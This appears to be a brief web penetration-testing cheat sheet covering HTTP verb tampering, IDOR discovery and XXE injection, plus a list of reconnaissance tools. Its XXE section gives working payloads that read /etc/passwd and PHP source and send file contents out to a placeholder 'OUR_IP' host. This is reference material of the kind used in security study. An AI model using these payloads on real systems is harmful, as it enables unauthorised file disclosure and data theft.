I. HTTP Verb Tampering

**HTTP Methods:**

- HEAD
    
- PUT
    
- DELETE
    
- OPTIONS
    
- PATCH
    

**Curl Command for HTTP Methods:**

```
curl -X OPTIONS <url>
```

II. IDOR (Insecure Direct Object References)

**Identification Techniques:**

- Inspect URL parameters and APIs.
    
- Analyze AJAX calls.
    
- Check for reference hashing/encoding.
    
- Compare user roles for access control discrepancies.
    

**Common Commands:**

```
echo -n 'string' | md5sum
echo -n 'string' | base64
```

III. XXE (XML External Entity Injection)

**Common XXE Payloads:**

```
<!ENTITY xxe SYSTEM "http://localhost/email.dtd">
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

IV. Additional Tools

- **Burp Suite** for testing HTTP methods and identifying IDORs.
    
- **Amass** for passive DNS enumeration.
    
- **Shodan** for discovering exposed services.
    
- **TheHarvester** for gathering information from public sources.
    
- **Censys** for advanced reconnaissance.